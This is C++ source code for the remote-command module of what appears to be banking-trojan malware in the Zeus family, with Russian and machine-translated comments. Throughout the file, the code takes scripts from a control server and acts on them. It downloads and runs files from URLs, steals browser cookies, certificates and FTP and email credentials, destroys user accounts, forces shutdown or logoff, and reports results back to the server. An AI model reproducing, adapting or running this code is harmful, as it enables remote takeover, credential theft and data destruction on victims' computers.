#include <windows.h>
#include <shellapi.h>
#include <wincrypt.h>
#include <shlwapi.h>
#include <wininet.h>

#include "defines.h"
#include "core.h"
#include "corehook.h"
#include "remotescript.h"
#include "dynamicconfig.h"
#include "localconfig.h"
#include "report.h"
#include "coreinstall.h"
#include "softwaregrabber.h"
#include "wininethook.h"
#include "nspr4hook.h"
#include "certstorehook.h"
#include "backconnectbot.h"
#include "httpgrabber.h"
#include "httptools.h"
#include "cryptedstrings.h"

#include "..\common\mem.h"
#include "..\common\str.h"
#include "..\common\debug.h"
#include "..\common\fs.h"
#include "..\common\process.h"
#include "..\common\sync.h"
#include "..\common\comlibrary.h"

//////////////////////////////////////////////////// ////////////////////////////////////////////////
//В Tools.
//////////////////////////////////////////////////// ////////////////////////////////////////////////

#if(BO_WININET > 0 || BO_NSPR4 > 0)
/*
  Операции со списками HttpGrabber'а.

  IN listId         - LocalConfig::ITEM_URLLIST_*.
  IN add            - true - добавление элементов в список,
                      false - удаление элементов из списка.
  IN arguments      - аргументы.
  IN argumentsCount - кол. аргументов.

  Return            - true - в случаи успеха,
                      false - в случаи ошибки.
*/
static bool httpGrabberListOperation(DWORD listId, bool add, const LPWSTR *arguments, DWORD argumentsCount)
{
  BinStorage::STORAGE *localConfig;
  if(argumentsCount > 1 && (localConfig = LocalConfig::beginReadWrite()) != NULL)
  {
    bool changed = false;
    LPSTR curItem;
    for(DWORD i = 1; i < argumentsCount; i++)
    {
      if((curItem = Str::_unicodeToAnsiEx(arguments[i], -1)) == NULL)
      {
        Mem::free(localConfig);
        LocalConfig::endReadWrite(NULL);
        return false;
      }

      if(add)          
      {
        if(HttpGrabber::_addUrlMaskToList(listId, &localConfig, curItem))changed = true;
      }
      else
      {
        if(HttpGrabber::_removeUrlMaskFromList(listId, &localConfig, curItem))changed = true;
      }

      Mem::free(curItem);
    }

    if(changed)return LocalConfig::endReadWrite(localConfig);

    Mem::free(localConfig);
    LocalConfig::endReadWrite(NULL);
    return true; //Ie already have everything or not at Speke.
  }
  return false;
}
#endif

//////////////////////////////////////////////////// ////////////////////////////////////////////////
//В Team.
//////////////////////////////////////////////////// ////////////////////////////////////////////////
enum
{
  PF_SHUTDOWN  = 0x01, //Vylyuchit computer.
  PF_REBOOT    = 0x02, //Reload this Computer.
  PF_LOGOFF    = 0x04, //Complete the current user session.
  PF_UNINSTALL = 0x08, //Remove bot.
  PF_DESTROY   = 0x10  //Destruction of the user.
};

static DWORD pendingFlags;

/*
  Выключение компьютера, пользователь должен обладать правами для этой операции.
*/
static bool osShutdown(const LPWSTR *arguments, DWORD argumentsCount)
{
  pendingFlags |= PF_SHUTDOWN;
  return true;
}

/*
  Перезагрузка компьютера, пользователь должен обладать правами для этой операции.
*/
static bool osReboot(const LPWSTR *arguments, DWORD argumentsCount)
{
  pendingFlags |= PF_REBOOT;
  return true;
}

/*
  Удаление бота с текущего пользователя.
*/
static bool botUninstall(const LPWSTR *arguments, DWORD argumentsCount)
{
  pendingFlags |= PF_UNINSTALL;
  return true;
}

/*
  Немедленное обновление файла конфигурации. Если казана URL, то обновление произойдет с указаной
  URL, и такжебудеит принудительно запушен бот-файл обнволения указаный в загружаемой конфигурации.
*/
static bool botUpdate(const LPWSTR *arguments, DWORD argumentsCount)
{
  LPSTR url = NULL;
  if(argumentsCount > 1 && arguments[1][0] != 0)
  {
    url = Str::_unicodeToAnsiEx(arguments[1], -1);
    if(url == NULL)return false;
  }

  bool retVal = DynamicConfig::download(url);
  Mem::free(url);
  
  return retVal;
}

#if(BO_BCSERVER_PLATFORMS > 0)
static bool botBcCommon(const LPWSTR *arguments, DWORD argumentsCount, bool isAdd)
{
  bool retVal = false;
  if(argumentsCount >= 4)
  {
    LPSTR servicePort = Str::_unicodeToAnsiEx(arguments[1], -1);
    LPSTR server      = Str::_unicodeToAnsiEx(arguments[2], -1);
    LPSTR serverPort  = Str::_unicodeToAnsiEx(arguments[3], -1);

    if(servicePort != NULL && server != NULL && serverPort != NULL)
    {
      if(isAdd)retVal = BackconnectBot::_addStatic(servicePort, server, serverPort);
      else retVal = BackconnectBot::_removeStatic(servicePort, server, serverPort);
    }

    Mem::free(servicePort);
    Mem::free(server);
    Mem::free(serverPort);
  }
  return retVal;
}

static bool botBcAdd(const LPWSTR *arguments, DWORD argumentsCount)
{
  return botBcCommon(arguments, argumentsCount, true);
}

static bool botBcRemove(const LPWSTR *arguments, DWORD argumentsCount)
{
  return botBcCommon(arguments, argumentsCount, false);
}
#endif

static bool botHttpInjectDisable(const LPWSTR *arguments, DWORD argumentsCount)
{
  return httpGrabberListOperation(LocalConfig::ITEM_URLLIST_BLOCKEDINJECTS, true, arguments, argumentsCount);
}

static bool botHttpInjectEnable(const LPWSTR *arguments, DWORD argumentsCount)
{
  return httpGrabberListOperation(LocalConfig::ITEM_URLLIST_BLOCKEDINJECTS, false, arguments, argumentsCount);
}

static bool fsPathGet(const LPWSTR *arguments, DWORD argumentsCount)
{
  //FIXME
  return false;
}

static bool fsSearchAdd(const LPWSTR *arguments, DWORD argumentsCount)
{
  //FIXME
  return false;
}

static bool fsSearchRemove(const LPWSTR *arguments, DWORD argumentsCount)
{
  //FIXME
  return false;
}

/*
  Уничтожение текущего пользователя.
*/
static bool userDestroy(const LPWSTR *arguments, DWORD argumentsCount)
{
  pendingFlags |= PF_DESTROY;
  return true;
}

/*
  Завершение текущей сессии пользователя.
*/
static bool userLogoff(const LPWSTR *arguments, DWORD argumentsCount)
{
  pendingFlags |= PF_LOGOFF;
  return true;
}

static bool userExecute(const LPWSTR *arguments, DWORD argumentsCount)
{
  bool ok = false;
  if(argumentsCount > 1 && arguments[1][0] != 0)
  {
    WCHAR filePath[MAX_PATH];
    
    //URL.
    Str::UTF8STRING u8Url;
    if(CWA(shlwapi, PathIsURLW)(arguments[1]) == TRUE)
    {
      if(Str::_utf8FromUnicode(arguments[1], -1, &u8Url))
      {
        //Create a temporary directory.
        if(Fs::_createTempDirectory(NULL, filePath))
        {
          //Obtain the file name.
          //FIXME: Content-Disposition
          LPWSTR fileName = HttpTools::_getFileNameFromUrl((LPSTR)u8Url.data);
          if(fileName != NULL && Fs::_pathCombine(filePath, filePath, fileName))
          {
            //Download file.
            Wininet::CALLURLDATA cud;
            Core::initDefaultCallUrlData(&cud);

            cud.pstrURL                   = (LPSTR)u8Url.data;
            cud.hStopEvent                = coreData.globalHandles.stopEvent;
            cud.DownloadData_pstrFileName = filePath;

            WDEBUG2(WDDT_INFO, "\"%S\" => \"%s\".", u8Url.data, filePath);
            ok = Wininet::_CallURL(&cud, NULL);
          }
#         if(BO_DEBUG > 0)
          else WDEBUG0(WDDT_ERROR, "Failed to get file name.");
#         endif

          Mem::free(fileName);
        }
#       if(BO_DEBUG > 0)
        else WDEBUG0(WDDT_ERROR, "Failed to create temp direcory.");
#       endif
      
        Str::_utf8Free(&u8Url);
      }
    }
    //Local path. Converting variables.
    else
    {
      DWORD size = CWA(kernel32, ExpandEnvironmentStringsW)(arguments[1], filePath, MAX_PATH);
      if(size > 0 && size < MAX_PATH)ok = true;
    }

    //Zapsuk file.
    if(ok)
    {
      LPWSTR commandLine = NULL;
      if(argumentsCount > 2 && (commandLine = Str::_joinArgumentsW(arguments + 2, argumentsCount - 2)) == NULL)
      {
        ok = false;
      }
      else
      {
        WDEBUG1(WDDT_INFO, "commandLine=[%s]", commandLine);
        //Start.
        ok = (((int)CWA(shell32, ShellExecuteW)(NULL, NULL, filePath, commandLine, NULL, SW_SHOWNORMAL)) > 32);
      
        //Well the point is ... It's worth a try.
        if(!ok)ok = (Process::_createEx(filePath, commandLine, NULL, NULL, NULL) != 0);
        
        Mem::free(commandLine);
      }
    }
  }
  return ok;
}

#if(BO_WININET > 0 || BO_NSPR4 > 0)
/*
  Получение куков известных браузеров.
*/
static bool userCookiesGet(const LPWSTR *arguments, DWORD argumentsCount)
{
# if(BO_WININET > 0)
  WininetHook::_getCookies();
# endif
# if(BO_NSPR4 > 0)
  Nspr4Hook::_getCookies();
# endif
  return true;
}

/*
  Удаление куков известных браузеров.
*/
static bool userCookiesRemove(const LPWSTR *arguments, DWORD argumentsCount)
{
# if(BO_WININET > 0)
  WininetHook::_removeCookies();
# endif
# if(BO_NSPR4 > 0)
  Nspr4Hook::_removeCookies();
# endif
  return true;
}
#endif

/*
  Сохранение серитифатов из MY.
*/
static bool userCertsGet(const LPWSTR *arguments, DWORD argumentsCount)
{
  return CertStoreHook::_exportMy();
}

/*
  Удаление серитифкатов из MY.
*/
static bool userCertsRemove(const LPWSTR *arguments, DWORD argumentsCount)
{
  return CertStoreHook::_clearMy();
}

#if(BO_WININET > 0 || BO_NSPR4 > 0)
static bool userUrlBlock(const LPWSTR *arguments, DWORD argumentsCount)
{
  return httpGrabberListOperation(LocalConfig::ITEM_URLLIST_BLOCKED, true, arguments, argumentsCount);
}

static bool userUrlUnblock(const LPWSTR *arguments, DWORD argumentsCount)
{
  return httpGrabberListOperation(LocalConfig::ITEM_URLLIST_BLOCKED, false, arguments, argumentsCount);
}
#endif

#if(BO_WININET > 0 || BO_NSPR4 > 0)
/*
  Установка домашних страницы для всех поддерживаемых браузеров.
*/
static bool userHomepageSet(const LPWSTR *arguments, DWORD argumentsCount)
{
  WCHAR fileName[MAX_PATH];
  Core::getPeSettingsPath(Core::PSP_QUICKSETTINGSFILE, fileName);

  if(argumentsCount > 1 && arguments[1][0] != 0)return Fs::_saveToFile(fileName, arguments[1], Str::_LengthW(arguments[1]) * sizeof(WCHAR));
  return Fs::_removeFile(fileName);
}
#endif

#if(BO_SOFTWARE_FTP > 0)
/*
  Получение данных FTP-клиентов.
*/
static bool userFtpClientsGet(const LPWSTR *arguments, DWORD argumentsCount)
{
  HRESULT comResult;
  if(ComLibrary::_initThread(&comResult))
  {
    SoftwareGrabber::_ftpAll();
    ComLibrary::_uninitThread(comResult);
    return true;
  }
  return false;  
}
#endif

#if(BO_SOFTWARE_EMAIL > 0)
/*
  Получение данных E-mail-клиентов.
*/
static bool userEmailClientsGet(const LPWSTR *arguments, DWORD argumentsCount)
{
  HRESULT comResult;
  if(ComLibrary::_initThread(&comResult))
  {
    SoftwareGrabber::_emailAll();
    ComLibrary::_uninitThread(comResult);
    return true;
  }
  return false;  
}
#endif

/*
  Получение куков флеш-плеера.
*/
static bool userFlashPlayerGet(const LPWSTR *arguments, DWORD argumentsCount)
{
  SoftwareGrabber::_getMacromediaFlashFiles();
  return true;
}

/*
  Удаление куков флеш-плеера.
*/
static bool userFlashPlayerRemove(const LPWSTR *arguments, DWORD argumentsCount)
{
  SoftwareGrabber::_removeMacromediaFlashFiles();
  return true;
}

/*
  Исполнение команд, которые должны исполниться после отправки ответа серверу.
*/
static void executePendingCommands(void)
{
  //Until the boat must maintain its activity.
  if(pendingFlags & PF_DESTROY)
  {
    Core::destroyUser();
    return;
  }
  
  if(pendingFlags & PF_UNINSTALL)
  {
    CoreInstall::_uninstall(false);
  }
  
  //Operation Shutdown, you can run only one of them.
  if(pendingFlags & (PF_REBOOT | PF_SHUTDOWN))
  {
    Process::_enablePrivilege(SE_SHUTDOWN_NAME, true);
    CWA(advapi32, InitiateSystemShutdownExW)(NULL, NULL, 0, TRUE, pendingFlags & PF_REBOOT ? TRUE : FALSE, SHTDN_REASON_MAJOR_OTHER | SHTDN_REASON_MINOR_OTHER | SHTDN_REASON_FLAG_PLANNED);
    return;
  }

  if(pendingFlags & PF_LOGOFF)
  {
    CWA(user32, ExitWindowsEx)(EWX_LOGOFF | EWX_FORCE | EWX_FORCEIFHUNG, SHTDN_REASON_MAJOR_OTHER | SHTDN_REASON_MINOR_OTHER | SHTDN_REASON_FLAG_PLANNED);
    return;
  }
}

//////////////////////////////////////////////////// ////////////////////////////////////////////////
//В Command structure.
//////////////////////////////////////////////////// ////////////////////////////////////////////////

typedef bool (*COMMANDPROC)(const LPWSTR *arguments, DWORD argumentsCount);
typedef struct
{
  WORD nameId;      //The name of the team.
  COMMANDPROC proc; //Function of command processing.
}COMMANDDATA;

static const COMMANDDATA commandData[] =
{
  //Work with the OC.
  {CryptedStrings::id_remotescript_command_os_shutdown,             osShutdown},
  {CryptedStrings::id_remotescript_command_os_reboot,               osReboot},
  
  //Working with a bot.
  {CryptedStrings::id_remotescript_command_bot_uninstall,           botUninstall},
  {CryptedStrings::id_remotescript_command_bot_update,              botUpdate},
#if(BO_BCSERVER_PLATFORMS > 0)
  {CryptedStrings::id_remotescript_command_bot_bc_add,              botBcAdd},
  {CryptedStrings::id_remotescript_command_bot_bc_remove,           botBcRemove},
#endif
  {CryptedStrings::id_remotescript_command_bot_httpinject_disable,  botHttpInjectDisable},
  {CryptedStrings::id_remotescript_command_bot_httpinject_enable,   botHttpInjectEnable},

  //Working with faly.
  {CryptedStrings::id_remotescript_command_fs_path_get,             fsPathGet},
  {CryptedStrings::id_remotescript_command_fs_search_add,           fsSearchAdd},
  {CryptedStrings::id_remotescript_command_fs_search_remove,        fsSearchRemove},
  
  //Working with the user.
  {CryptedStrings::id_remotescript_command_user_destroy,            userDestroy},
  {CryptedStrings::id_remotescript_command_user_logoff,             userLogoff},
  {CryptedStrings::id_remotescript_command_user_execute,            userExecute},
#if(BO_WININET > 0 || BO_NSPR4 > 0)
  {CryptedStrings::id_remotescript_command_user_cookies_get,        userCookiesGet},
  {CryptedStrings::id_remotescript_command_user_cookies_remove,     userCookiesRemove},
#endif
  {CryptedStrings::id_remotescript_command_user_certs_get,          userCertsGet},
  {CryptedStrings::id_remotescript_command_user_certs_remove,       userCertsRemove},
#if(BO_WININET > 0 || BO_NSPR4 > 0)
  {CryptedStrings::id_remotescript_command_user_url_block,          userUrlBlock},
  {CryptedStrings::id_remotescript_command_user_url_unblock,        userUrlUnblock},
#endif
#if(BO_WININET > 0 || BO_NSPR4 > 0)
  {CryptedStrings::id_remotescript_command_user_homepage_set,       userHomepageSet},
#endif
#if(BO_SOFTWARE_FTP > 0)
  {CryptedStrings::id_remotescript_command_user_ftpclients_get,     userFtpClientsGet},
#endif
#if(BO_SOFTWARE_EMAIL > 0)
  {CryptedStrings::id_remotescript_command_user_emailclients_get,   userEmailClientsGet},
#endif
  {CryptedStrings::id_remotescript_command_user_flashplayer_get,    userFlashPlayerGet},
  {CryptedStrings::id_remotescript_command_user_flashplayer_remove, userFlashPlayerRemove},
};

//////////////////////////////////////////////////// ////////////////////////////////////////////////
//In RemoteScript
//////////////////////////////////////////////////// ////////////////////////////////////////////////

typedef struct
{
  WORD errorMessageId; //Error message, or 0.
  DWORD errorLine;     //Error string or (DWORD) -1.
  LPBYTE hash;         //Hash of the script.
}SCRIPTDATA;

void RemoteScript::init(void)
{

}

void RemoteScript::uninit(void)
{

}

static int requestProc(DWORD loop, Report::SERVERSESSION *session)
{
  if(Report::addBasicInfo(&session->postData, Report::BIF_BOT_ID | Report::BIF_BOT_VERSION))
  {
    SCRIPTDATA *scriptData = (SCRIPTDATA *)session->customData;
    DWORD status = scriptData->errorMessageId == 0 ? 0 : 1;
    
    //Because message write only the first half of ascii, no sense messing with Unicode/UTF8.
    char message[CryptedStrings::len_max + 10/*DWORD*/];

    if(scriptData->errorMessageId == 0)CryptedStrings::_getA(CryptedStrings::id_remotescript_error_success, message);
    else if(scriptData->errorLine == (DWORD)-1)CryptedStrings::_getA(scriptData->errorMessageId, message);
    else
    {
      char messageFormat[CryptedStrings::len_max];
      CryptedStrings::_getA(scriptData->errorMessageId, messageFormat);
      Str::_sprintfA(message, sizeof(message) / sizeof(char), messageFormat, scriptData->errorLine);
    }
    
    if(BinStorage::_addItem(&session->postData, SBCID_SCRIPT_ID,     BinStorage::ITEMF_COMBINE_OVERWRITE, scriptData->hash, MD5HASH_SIZE) &&
       BinStorage::_addItem(&session->postData, SBCID_SCRIPT_STATUS, BinStorage::ITEMF_COMBINE_OVERWRITE, &status, sizeof(DWORD)) &&
       BinStorage::_addItem(&session->postData, SBCID_SCRIPT_RESULT, BinStorage::ITEMF_COMBINE_OVERWRITE, message, Str::_LengthA(message)))
    {
      return Report::SSPR_CONTUNUE;
    }
  }
  return Report::SSPR_ERROR;
}

static int resultProc(DWORD loop, Report::SERVERSESSION *session)
{
  return Report::SSPR_END;
}

/*
  Проверка статус скрипта.

  IN hash - MD5 хэш скрипта.

  Return  - 0 - в случаи успеха,
            CryptedStrings::id_* - в случаи провала.
*/
static WORD getScriptStatusByHash(LPBYTE hash)
{
  WORD errorMessageId = NULL;
  BinStorage::STORAGE *localConfig = LocalConfig::beginReadWrite();

  if(localConfig == NULL)
  {
    errorMessageId = CryptedStrings::id_remotescript_error_failed_to_load;
  }
  else
  {
    DWORD size;
    LPBYTE hashList = (LPBYTE)BinStorage::_getItemDataEx(localConfig, LocalConfig::ITEM_REMOTESCRIPT_HASH, BinStorage::ITEMF_IS_SETTING, &size);

    if(hashList != NULL && size % MD5HASH_SIZE == 0)
    {
      for(DWORD i = 0; i < size; i += MD5HASH_SIZE)if(Mem::_compare(hash, hashList + i, MD5HASH_SIZE) == 0)
      {
        errorMessageId = CryptedStrings::id_remotescript_error_already_executed;
        break;
      }

      //Adding a new hash.
      if(errorMessageId == 0)
      {
        bool added = false;
        if(Mem::reallocEx(&hashList, size + MD5HASH_SIZE))
        {
          Mem::_copy(hashList + size, hash, MD5HASH_SIZE);
          added = BinStorage::_modifyItemById(&localConfig, LocalConfig::ITEM_REMOTESCRIPT_HASH, BinStorage::ITEMF_IS_SETTING | BinStorage::ITEMF_COMBINE_OVERWRITE, hashList, size + MD5HASH_SIZE);
        }

        if(!added)
        {
          errorMessageId = CryptedStrings::id_remotescript_error_not_enough_memory;
          WDEBUG0(WDDT_ERROR, "_modifyItemById or reallocEx failed.");
        }
      }
    }
    //Or damage to any command yet when it is not accepted. Create a new list.
    else if(!BinStorage::_addItem(&localConfig, LocalConfig::ITEM_REMOTESCRIPT_HASH, BinStorage::ITEMF_IS_SETTING | BinStorage::ITEMF_COMBINE_OVERWRITE, hash, MD5HASH_SIZE))
    {
      errorMessageId = CryptedStrings::id_remotescript_error_not_enough_memory;
      WDEBUG0(WDDT_ERROR, "_addItem failed.");
    }

    //If an error occurs, make changes, do not need.
    if(errorMessageId != 0)
    {
      Mem::free(localConfig);
      localConfig = NULL;
    }

    //Release memory and saving the configuration.
    Mem::free(hashList);
    if(!LocalConfig::endReadWrite(localConfig) && localConfig != NULL)errorMessageId = CryptedStrings::id_remotescript_error_failed_to_save;
  }

  return errorMessageId;
}

/*
  Execution of the script.

  IN scriptText - текст скрипта.
  OUT errorLine - строка на котроый произошла ошибка, или (DWORD)-1 если ошиюка произошла не на
                  строке.
  Return        - 0 - в случаи успеха,
                  CryptedStrings::id_* - случаи провала.
*/
static WORD executeScript(LPWSTR scriptText, LPDWORD errorLine)
{
  WORD errorMessageId = 0;
  LPWSTR *lines;
  DWORD linesCount = Str::_splitToStringsW(scriptText, Str::_LengthW(scriptText), &lines, Str::STS_TRIM, 0);
  //* ErrorLine = (DWORD) -1;
  
  if(linesCount == (DWORD)-1)
  {
    errorMessageId = CryptedStrings::id_remotescript_error_not_enough_memory;
    WDEBUG0(WDDT_ERROR, "_splitToStringsW failed.");
  }
  else
  {
    //Enumerate the rows.
    for(DWORD i = 0; i < linesCount; i++)if(lines[i] != NULL && lines[i][0] != 0)
    {
      LPWSTR *args;
      DWORD argsCount = Str::_getArgumentsW(lines[i], Str::_LengthW(lines[i]), &args, 0);

      if(argsCount == (DWORD)-1)
      {
        errorMessageId = CryptedStrings::id_remotescript_error_not_enough_memory;
        WDEBUG0(WDDT_ERROR, "_getArgumentsW failed.");
        break;
      }
      else
      {
        if(argsCount > 0)
        {
          WCHAR commandNameBuffer[CryptedStrings::len_max];
          
          //Ischim team.
          DWORD ci = 0;
          for(; ci < sizeof(commandData) / sizeof(COMMANDDATA); ci++)
          {
            CryptedStrings::_getW(commandData[ci].nameId, commandNameBuffer);
            if(CWA(kernel32, lstrcmpiW)(args[0], commandNameBuffer) == 0)
            {
              WDEBUG1(WDDT_INFO, "Executing command \"%s\".", commandNameBuffer);
              if(!commandData[ci].proc(args, argsCount))
              {
                WDEBUG1(WDDT_ERROR, "Command \"%s\" failed.", commandNameBuffer);
                errorMessageId = CryptedStrings::id_remotescript_error_command_failed;
                *errorLine   = i + 1;
              }
              break;
            }
          }

          //If the command was not found.
          if(ci == sizeof(commandData) / sizeof(COMMANDDATA))
          {
            WDEBUG1(WDDT_INFO, "Unknown command \"%s\".", args[0]);
            errorMessageId = CryptedStrings::id_remotescript_error_command_unknown;
            *errorLine   = i + 1;
          }
        }
        Mem::freeArrayOfPointers(args, argsCount);
      }

      //If you found an error aborts the script.
      if(errorMessageId != 0)break;
    }
    Mem::freeArrayOfPointers(lines, linesCount);
  }

  return errorMessageId;
}

/*В В The entry point for processing the script.

В В IN p - BinStorage:: STORAGE.

В В Return - 0.*/
static DWORD WINAPI scriptProc(void *p)
{
  CoreHook::disableFileHookerForCurrentThread(true);
  HANDLE mutex = Core::waitForMutexOfObject(Core::OBJECT_ID_REMOTESCRIPT, MalwareTools::KON_GLOBAL);
  if(mutex == NULL)
  {
    WDEBUG0(WDDT_ERROR, "Failed.");
    return 1;
  }
  
  WDEBUG0(WDDT_INFO, "Started.");

  BinStorage::STORAGE *script = (BinStorage::STORAGE *)p;
  BinStorage::ITEM *curItem = NULL;
  LPBYTE currentHash;
  pendingFlags = 0;
  
  //Overview of scripts.
  while((curItem = BinStorage::_getNextItem(script, curItem)))if(curItem->realSize > MD5HASH_SIZE && (currentHash = (LPBYTE)BinStorage::_getItemData(curItem)) != NULL)
  {
    WDEBUG1(WDDT_INFO, "Founded script with size %u", curItem->realSize);

    //Data were obtained on a hash script.
    WORD errorMessageId = getScriptStatusByHash(currentHash);
    DWORD errorLine = (DWORD)-1;

    //Execution of the script.
    if(errorMessageId == 0)
    {
      LPWSTR scriptText = Str::_utf8ToUnicode((LPSTR)((LPBYTE)currentHash + MD5HASH_SIZE), curItem->realSize - MD5HASH_SIZE);
      if(scriptText == NULL)
      {
        errorMessageId = CryptedStrings::id_remotescript_error_not_enough_memory;
        WDEBUG0(WDDT_ERROR, "_utf8ToUnicode failed.");
      }
      else
      {
        errorMessageId = executeScript(scriptText, &errorLine);
      }
      Mem::free(scriptText);
    }
    
    //Sending a response from the server.
    {
      BinStorage::STORAGE *config;
      if((config = DynamicConfig::getCurrent()))
      {
        LPSTR url = (LPSTR)BinStorage::_getItemDataEx(config, CFGID_URL_SERVER_0, BinStorage::ITEMF_IS_OPTION, NULL);
        Mem::free(config);

        if(url && *url != 0)
        {
          Crypt::RC4KEY rc4Key;
          {
            BASECONFIG baseConfig;
            Core::getBaseConfig(&baseConfig);
            Mem::_copy(&rc4Key, &baseConfig.baseKey, sizeof(Crypt::RC4KEY));
          }
          
          SCRIPTDATA scriptData;
          scriptData.errorMessageId = errorMessageId;
          scriptData.errorLine      = errorLine;
          scriptData.hash           = currentHash;

          Report::SERVERSESSION serverSession;
          serverSession.url         = url;
          serverSession.requestProc = requestProc;
          serverSession.resultProc  = resultProc;
          serverSession.stopEvent   = NULL;//coreData.globalHandles.stopEvent; / / If we downloaded the update, then there is no time CHASSENEUIL post a reply.
          serverSession.rc4Key      = &rc4Key;
          serverSession.postData    = NULL;
          serverSession.customData  = &scriptData;

          Report::startServerSession(&serverSession);
        }
        Mem::free(url);
      }
    }

    Mem::free(currentHash);
  }
  
  Mem::free(script);
  executePendingCommands();  
  WDEBUG0(WDDT_INFO, "Stopped.");
  Sync::_freeMutex(mutex);

  return 0;
}

bool RemoteScript::_exec(BinStorage::STORAGE *script)
{
  return (Process::_createThread(0, scriptProc, script) != 0);
}
